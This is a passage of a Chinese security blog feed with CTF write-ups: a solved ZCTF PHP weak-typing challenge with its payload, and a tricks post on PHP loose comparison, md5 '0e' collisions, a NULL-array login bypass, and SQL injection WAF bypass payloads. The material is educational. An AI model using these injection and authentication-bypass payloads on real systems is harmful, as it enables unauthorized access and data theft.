      &lt;h3 id=&quot;0x01-字母a&quot;&gt;&lt;a href=&quot;#0x01-字母a&quot; class=&quot;headerlink&quot; title=&quot;0x01 字母a&quot;&gt;&lt;/a&gt;0x01 字母a&lt;/h3&gt;&lt;figure class=&quot;highlight mojolicious&quot;&gt;&lt;table&gt;&lt;tr&gt;
    
    </summary>
    
    
      <category term="waf" scheme="http://yoursite.com/tags/waf/"/>
    
  </entry>
  
  <entry>
    <title>ZCTF线下赛php弱类型</title>
    <link href="http://yoursite.com/2017/04/05/ZCTF%E7%BA%BF%E4%B8%8B%E8%B5%9Bphp%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    <id>http://yoursite.com/2017/04/05/ZCTF线下赛php弱类型/</id>
    <published>2017-04-05T15:09:35.000Z</published>
    <updated>2017-04-06T05:06:16.824Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01源码获取"><a href="#0x01源码获取" class="headerlink" title="0x01源码获取"></a>0x01源码获取</h3><p>源码泄露，通过源码泄露工具获得一个php文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">define(<span class="string">'FLAG'</span>,<span class="string">'CTF&#123;THIS_IS_FLAG&#125;'</span>);</div><div class="line">$l01o=<span class="number">0</span>;</div><div class="line">$o1l0=<span class="number">0</span>;</div><div class="line">$o10l=<span class="number">0</span>;</div><div class="line">$lo10=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'vhghf'</span>])) <span class="comment">//GET传入一个vhghf</span></div><div class="line">&#123;</div><div class="line">        $vhghf = $_GET[<span class="string">'vhghf'</span>];</div><div class="line">        $vhghf==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//如果vhghf等于1则退出</span></div><div class="line">        <span class="keyword">switch</span> ($vhghf)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//如果vhghf等于1则$101o等于1</span></div><div class="line">                $l01o=<span class="number">1</span>;</div><div class="line">                <span class="keyword">echo</span> <span class="string">"1"</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">$dfgdf=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'dfgdf'</span>]); <span class="comment">//GET传入dfgdf且进行json_decode且创建一个数组</span></div><div class="line"><span class="keyword">if</span>(is_array($dfgdf))&#123;  <span class="comment">//如果为数组则进行接下来的</span></div><div class="line">    is_numeric(@$dfgdf[<span class="string">"gvnghdjk"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//判断dfgdf中的gvnghdjk是否为数字或数字字符串</span></div><div class="line">    <span class="keyword">if</span>(@$dfgdf[<span class="string">"gvnghdjk"</span>])&#123;</div><div class="line">        ($dfgdf[<span class="string">"gvnghdjk"</span>]&gt;<span class="number">2017</span>)?$o1l0=<span class="number">1</span>:<span class="keyword">NULL</span>; <span class="comment">//gvnghdjk大于2017</span></div><div class="line">         </div><div class="line">    &#125;</div><div class="line">    var_dump($dfgdf[<span class="string">"uxcndffznb"</span>]);</div><div class="line">    <span class="keyword">if</span>(is_array(@$dfgdf[<span class="string">"uxcndffznb"</span>]))&#123; <span class="comment">//uxcndffznb要为数组</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">"2"</span>;</div><div class="line">        <span class="keyword">if</span>(count($dfgdf[<span class="string">"uxcndffznb"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($dfgdf[<span class="string">"uxcndffznb"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); <span class="comment">//数组中有两个值，且第一个还要为数组</span></div><div class="line">        $kghdhfghdfgbcvhgffg = array_search(<span class="string">"ZCTF"</span>, $dfgdf[<span class="string">"uxcndffznb"</span>]); <span class="comment">//查询uxcndffznb中有没有ZCTF有则返回1没则返回false</span></div><div class="line">        var_dump($kghdhfghdfgbcvhgffg);</div><div class="line">        $kghdhfghdfgbcvhgffg===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//如果为false则退出</span></div><div class="line">        <span class="keyword">foreach</span>($dfgdf[<span class="string">"uxcndffznb"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; <span class="comment">//查询uxcndffznb中是否有ZCTF如果有则退出</span></div><div class="line">            var_dump($val);</div><div class="line">			</div><div class="line">            $val===<span class="string">"ZCTF"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">			<span class="keyword">echo</span> $val;</div><div class="line">        &#125;</div><div class="line">        $o10l=<span class="number">1</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"3"</span>.<span class="string">"&lt;br&gt;"</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">$cdggjydcnfsdyjaq = $_GET[<span class="string">'cdggjydcnfsdyjaq'</span>]; <span class="comment">//MD5碰撞</span></div><div class="line"><span class="keyword">if</span> ($cdggjydcnfsdyjaq != <span class="string">'15562'</span>) &#123;</div><div class="line">    <span class="keyword">if</span> (strstr($cdggjydcnfsdyjaq, <span class="string">'2017ZCTF'</span>)) &#123;</div><div class="line">        <span class="keyword">if</span> (substr(md5($cdggjydcnfsdyjaq),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"4"</span>.<span class="string">"&lt;br&gt;"</span>;</div><div class="line">            $lo10=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($l01o &amp;&amp; $o1l0 &amp;&amp; $o10l &amp;&amp; $lo10)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"success,flag:"</span>.FLAG;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>getflag前提：要求($l01o &amp;&amp; $o1l0 &amp;&amp; $o10l &amp;&amp; $lo10)都符合要求了就出flag，而具体看就是要求这四个值都为1</p>
<h3 id="0x02分析"><a href="#0x02分析" class="headerlink" title="0x02分析"></a>0x02分析</h3><h4 id="l01o"><a href="#l01o" class="headerlink" title="l01o"></a>l01o</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">将vhghf与<span class="number">1</span>进行比较，而且是双等号，直接<span class="number">1</span>+任意字母绕过</div></pre></td></tr></table></figure>
<h4 id="o1l0-o10l"><a href="#o1l0-o10l" class="headerlink" title="o1l0+o10l"></a>o1l0+o10l</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">dfgdf[<span class="string">"gvnghdjk"</span>]&gt;<span class="number">2017</span>与第一个相似，用大于<span class="number">2017</span>的数值加任意字母绕过</div><div class="line"></div><div class="line">array_search是弱类型的比较</div><div class="line">var_dump(in_array(<span class="string">"abc"</span>, $array1));&lt;/br&gt;</div><div class="line">var_dump(in_array(<span class="string">"1bc"</span>, $array2));</div><div class="line">它遍历了array的每个值，并且作<span class="string">"=="</span>比较（“当设置了strict 用===”）</div><div class="line">结果很明显了</div><div class="line">如果array1里面有个值为<span class="number">0</span>，那么第一条返回就会为真<span class="comment">//intval('abc')=0</span></div><div class="line">如果array2里面有个值为<span class="number">1</span>，那么第二条就会为真<span class="comment">//intval('1bc')=1</span></div><div class="line">数字<span class="number">0</span>双等于所有的无数字开头的字符串，可以用<span class="number">0</span>去绕过array_search的比较</div></pre></td></tr></table></figure>
<h4 id="lo10"><a href="#lo10" class="headerlink" title="lo10"></a>lo10</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$cdggjydcnfsdyjaq != '<span class="number">15562</span>'</div><div class="line"></div><div class="line">(substr(md5($cdggjydcnfsdyjaq),<span class="number">8</span>,<span class="number">16</span>) == substr(md5('<span class="number">15562</span>'),<span class="number">8</span>,<span class="number">16</span>))</div></pre></td></tr></table></figure>
<p>线上赛已经出现过</p>
<h3 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload=</div><div class="line">?vhghf=<span class="number">1</span>a$&amp;<span class="variable">&amp;dfgdf</span>=&#123;<span class="string">"gvnghdjk"</span>:<span class="string">"2018aaa"</span>,<span class="string">"uxcndffznb"</span>:[[<span class="string">"ZCTF"</span>],<span class="number">0</span>]&#125;&amp;<span class="variable">&amp;cdggjydcnfsdyjaq</span>=x2017ZCTF24834</div></pre></td></tr></table></figure>
<p><img src="http://i1.piimg.com/567571/7fe8c9df09135bd0.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01源码获取&quot;&gt;&lt;a href=&quot;#0x01源码获取&quot; class=&quot;headerlink&quot; title=&quot;0x01源码获取&quot;&gt;&lt;/a&gt;0x01源码获取&lt;/h3&gt;&lt;p&gt;源码泄露，通过源码泄露工具获得一个php文件&lt;br&gt;&lt;figure class=&quot;highl
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF Tricks</title>
    <link href="http://yoursite.com/2017/04/05/CTF-Tricks/"/>
    <id>http://yoursite.com/2017/04/05/CTF-Tricks/</id>
    <published>2017-04-05T05:03:32.000Z</published>
    <updated>2017-04-05T15:32:11.557Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-php弱类型"><a href="#0x01-php弱类型" class="headerlink" title="0x01 php弱类型"></a>0x01 php弱类型</h3><h4 id="什么是php弱类型"><a href="#什么是php弱类型" class="headerlink" title="什么是php弱类型"></a>什么是php弱类型</h4><p>php变量类型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">string</div><div class="line">integer</div><div class="line"><span class="keyword">array</span></div><div class="line">double</div><div class="line">object</div><div class="line">resource</div><div class="line"><span class="keyword">NULL</span></div><div class="line"></div><div class="line">string <span class="keyword">array</span> <span class="keyword">NULL</span>  可以从RGPC传入</div><div class="line">遇到不符类型，自动转换</div></pre></td></tr></table></figure></p>
<p>php类型装换<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="string">''</span> == <span class="number">0</span> == <span class="keyword">false</span></div><div class="line"><span class="string">'123'</span> == <span class="number">123</span></div><div class="line"><span class="string">'abc'</span> == <span class="number">0</span></div><div class="line"><span class="string">'123a'</span> == <span class="number">123</span></div><div class="line"><span class="string">'0x01'</span> == <span class="number">1</span></div><div class="line"><span class="string">'0e123456789'</span> == <span class="string">'0e987654321'</span></div><div class="line">[<span class="keyword">false</span>] == [<span class="number">0</span>] == [<span class="keyword">NULL</span>] == [<span class="string">''</span>]</div><div class="line"><span class="keyword">NULL</span> == <span class="keyword">false</span> == <span class="number">0</span></div><div class="line"><span class="keyword">true</span> == <span class="number">1</span></div></pre></td></tr></table></figure></p>
<a id="more"></a>
<h4 id="题型1-scrcmp"><a href="#题型1-scrcmp" class="headerlink" title="题型1 scrcmp"></a>题型1 scrcmp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">define(<span class="string">'FLAG'</span>,<span class="string">'CTF&#123;THIS_IS_FLAG&#125;'</span>);</div><div class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'flag'</span>],FLAG) == <span class="number">0</span>)&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"success,flag:"</span>.FLAG;</div><div class="line">&#125;</div><div class="line"></div><div class="line">scrcmp:如果 str1 小于 str2 返回 &lt; <span class="number">0</span>； 如果 str1 大于 str2 返回 &gt; <span class="number">0</span>；如果两者相等，返回 <span class="number">0</span></div><div class="line">strcmp比较出错=&gt;返回<span class="keyword">NULL</span>=&gt;<span class="keyword">NULL</span> == <span class="number">0</span> =&gt;</div></pre></td></tr></table></figure>
<p><img src="http://i4.buimg.com/567571/ad87307d19e8920c.png" alt=""></p>
<h4 id="题型2-字符串比较（原值不相等，md5值相等）"><a href="#题型2-字符串比较（原值不相等，md5值相等）" class="headerlink" title="题型2 字符串比较（原值不相等，md5值相等）"></a>题型2 字符串比较（原值不相等，md5值相等）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">define(<span class="string">'FLAG'</span>,<span class="string">'CTF&#123;THIS_IS_FLAG&#125;'</span>);</div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'s1'</span>] != $_GET[<span class="string">'s2'</span>]</div><div class="line">	&amp;&amp; md5($_GET[<span class="string">'s1'</span>]) == md5($_GET[<span class="string">'s2'</span>]))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"success,flag:"</span>.FLAG;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://i2.muimg.com/567571/1b97150d0fd6d935.png" alt=""></p>
<h5 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h5><blockquote>
<p>什么是科学计数法</p>
</blockquote>
<p>‘0e123456789’ == ‘0e987654321’ == 0</p>
<blockquote>
<p>md5值的取值范围</p>
</blockquote>
<p>‘0123456789abcdef’</p>
<blockquote>
<p>[0e+数字]的md5</p>
</blockquote>
<p>md5(‘QNKCDZO’) ==<br>‘0e830400451993494058024219903391’</p>
<p>md5(‘240610708’) ==<br>‘0e462097431906509019562988736854’</p>
<h5 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h5><blockquote>
<p>PHP md5函数特性</p>
</blockquote>
<p>md5([1,2,3]) == md5([4,5,6]) == NULL</p>
<blockquote>
<p>数组Trick,无需再利用弱类型比较特性<br><img src="http://i1.piimg.com/567571/cb2f754cdbe6b79a.png" alt=""><br>总结的一些常用的比较<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">php &gt; var_dump(md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>));</div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>),   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                    </div><div class="line">  string(<span class="number">32</span>) <span class="string">"0e462097431906509019562988736854"</span></div><div class="line">  string(<span class="number">32</span>) <span class="string">"0e830400451993494058024219903391"</span></div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ===   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                 </div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(<span class="string">"0e462097431906509019562988736854"</span> == <span class="string">"0e830400451993494058024219903391"</span>);</div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(<span class="string">"0e462097431906509019562988736854"</span> === <span class="string">"0e830400451993494058024219903391"</span>);</div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ===   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                 </div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ==   md5(<span class="string">'QNKCDZO'</span>));                                                                                       </div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) === md5(<span class="string">'QNKCDZO'</span>));</div><div class="line">  bool(<span class="keyword">false</span>)</div></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="题型3-登录逻辑常见考点"><a href="#题型3-登录逻辑常见考点" class="headerlink" title="题型3 登录逻辑常见考点"></a>题型3 登录逻辑常见考点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$name = addcslashes($_POST[<span class="string">'name'</span>]);</div><div class="line">$r = $db-&gt;get_row(<span class="string">"SELECT `pass` FROM `user` WHERE `name`='&#123;$name&#125;'"</span>);</div><div class="line"><span class="keyword">if</span>($r[<span class="string">'pass'</span>] === md5($_POST[<span class="string">'pass'</span>]))&#123;</div><div class="line">	<span class="comment">//...login success</span></div><div class="line">&#125;</div><div class="line">不存在sql注入漏洞</div><div class="line">密码比较使用严格模式“===”，故此处不存在弱类型比较漏洞</div></pre></td></tr></table></figure>
<p>运行流程:</p>
<p><img src="http://i2.muimg.com/567571/4b6433b7282b4e81.png" alt=""></p>
<blockquote>
<p>NULL的巧妙构造<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">用户不存在=&gt;$r[<span class="string">'pass'</span>]&lt;=&gt;<span class="keyword">NULL</span></div><div class="line">密码是数组=&gt;md5($_POST[<span class="string">'pass'</span>]) ⇔ <span class="keyword">NULL</span></div><div class="line">$r[<span class="string">'pass'</span>] === md5($_POST[<span class="string">'pass'</span>])</div><div class="line"><span class="keyword">NULL</span> === <span class="keyword">NULL</span> 成立</div><div class="line">成功登录！</div></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="0x02-发现源码（题面信息越少，越可能需要找到源码）"><a href="#0x02-发现源码（题面信息越少，越可能需要找到源码）" class="headerlink" title="0x02 发现源码（题面信息越少，越可能需要找到源码）"></a>0x02 发现源码（题面信息越少，越可能需要找到源码）</h3><blockquote>
<p>发现套路<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">题目只给出一个登录框</div><div class="line">页面只有一两行字</div><div class="line">页面中包含Powered XXX</div></pre></td></tr></table></figure></p>
</blockquote>
<p>关于misc查看通讯地址Trick</p>
<p>直接丢到 <a href="https://www.virustotal.com/" target="_blank" rel="external">https://www.virustotal.com/</a> 在 Behavioural information 可以看到通讯地址</p>
<p>源码发掘考点一览<br><img src="http://i2.muimg.com/567571/8ad57cf3994ffdea.png" alt=""></p>
<h3 id="0x03-CTF比赛中的那些WAF与绕过"><a href="#0x03-CTF比赛中的那些WAF与绕过" class="headerlink" title="0x03 CTF比赛中的那些WAF与绕过"></a>0x03 CTF比赛中的那些WAF与绕过</h3><h4 id="题型4-字符串替换WAF"><a href="#题型4-字符串替换WAF" class="headerlink" title="题型4 字符串替换WAF"></a>题型4 字符串替换WAF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$str = str_replace(<span class="string">"select"</span>, <span class="string">""</span>, $str);</div><div class="line">$str = str_replace(<span class="string">"union"</span>, <span class="string">""</span>, $str);</div><div class="line">$str = str_replace(<span class="string">"into"</span>, <span class="string">""</span>, $str);</div></pre></td></tr></table></figure>
<p>一大堆非常严格的过滤，最后出现一处字符串替换空型WAF</p>
<p>方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test.php?str=<span class="number">-1</span> uniunionon selselectect <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> from `admin` limit <span class="number">1</span></div></pre></td></tr></table></figure></p>
<h4 id="题型5-字符替换空型WAF加强版"><a href="#题型5-字符替换空型WAF加强版" class="headerlink" title="题型5 字符替换空型WAF加强版"></a>题型5 字符替换空型WAF加强版</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$tmp_str = <span class="string">""</span>;</div><div class="line"><span class="keyword">while</span>($tmp_str != $str) &#123;</div><div class="line"> $tmp_str = $str;</div><div class="line"> $str = str_replace(<span class="string">"select"</span>, <span class="string">""</span>, $str);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过循环替换转移注意力，实际简单的大小写变换即可绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test.php?str=<span class="number">-1</span> UniON SeLeCT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> FrOM `admin` LiMiT <span class="number">1</span></div></pre></td></tr></table></figure></p>
<h4 id="题型6-特殊字符-串-拦截型WAF"><a href="#题型6-特殊字符-串-拦截型WAF" class="headerlink" title="题型6 特殊字符(串)拦截型WAF"></a>题型6 特殊字符(串)拦截型WAF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(\bselect\b|\bunion\b|and|or|;|,|#|\(|\))/is'</span>,</div><div class="line">$_GET[<span class="string">'id'</span>])) &#123;</div><div class="line"> <span class="keyword">exit</span>(<span class="string">'BAD ID'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>####那些常见的SQL Trick<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[\bselect\b] 或 [\bunion\b]: </div><div class="line">    Mysql条件注释的利用 <span class="comment">/*!50000select*/</span></div><div class="line">    浮点数利用WHERE id=0.1UnIoN <span class="keyword">SeLeCT</span> ...</div><div class="line">[#]</div><div class="line">    Mysql注释符:<span class="comment">/**/</span>,<span class="comment">/*!条件注释*、,--,;,`</span></div><div class="line">[,]</div><div class="line">    盲注 mid(user() from 1 for 1) == mid(user(),1,1)</div><div class="line">    UNION注入 union select * from (select 1)a join (select 2)b ==union select 1,2</div><div class="line">[and] 或 [or]: </div><div class="line">    查缺补漏xor,||,&amp;&amp;.!,not</div><div class="line">[&gt;|=|&lt;] 逻辑操作符:</div><div class="line">    关键字替代符号 between、like、rlike、regex、is</div><div class="line">    与0比较法 -1 or 1=1 and ord(substr(user(),1,1))-114</div><div class="line">[空白符]</div><div class="line">    控制字符替代法20 09 0A 0B 0C 0D A0</div><div class="line">    符号替代法 /**/、select.<span class="string">``</span>.password、<span class="keyword">select</span>+<span class="keyword">user</span>()</div><div class="line">    括号组合法 <span class="keyword">union</span>(<span class="keyword">select</span>(<span class="number">1</span>),<span class="number">2</span>)、<span class="keyword">select</span>&#123;x(<span class="keyword">password</span>)&#125;<span class="keyword">from</span>&#123;x(<span class="keyword">user</span>)&#125;</div></pre></td></tr></table></figure></p>
<p><a href="https://regex101.com/" target="_blank" rel="external">不要害怕正则</a></p>
<p>未完待续！！！！！！！！</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.leavesongs.com/SHARE/some-ctf-tricks-ppt.html" target="_blank" rel="external">CTF比赛总是输？你还差点Tricks!</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-php弱类型&quot;&gt;&lt;a href=&quot;#0x01-php弱类型&quot; class=&quot;headerlink&quot; title=&quot;0x01 php弱类型&quot;&gt;&lt;/a&gt;0x01 php弱类型&lt;/h3&gt;&lt;h4 id=&quot;什么是php弱类型&quot;&gt;&lt;a href=&quot;#什么是php弱类型&quot; class=&quot;headerlink&quot; title=&quot;什么是php弱类型&quot;&gt;&lt;/a&gt;什么是php弱类型&lt;/h4&gt;&lt;p&gt;php变量类型&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;string&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;integer&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;double&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;object&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;resource&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;string &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt;  可以从RGPC传入&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;遇到不符类型，自动转换&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;php类型装换&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; == &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;123&#39;&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span 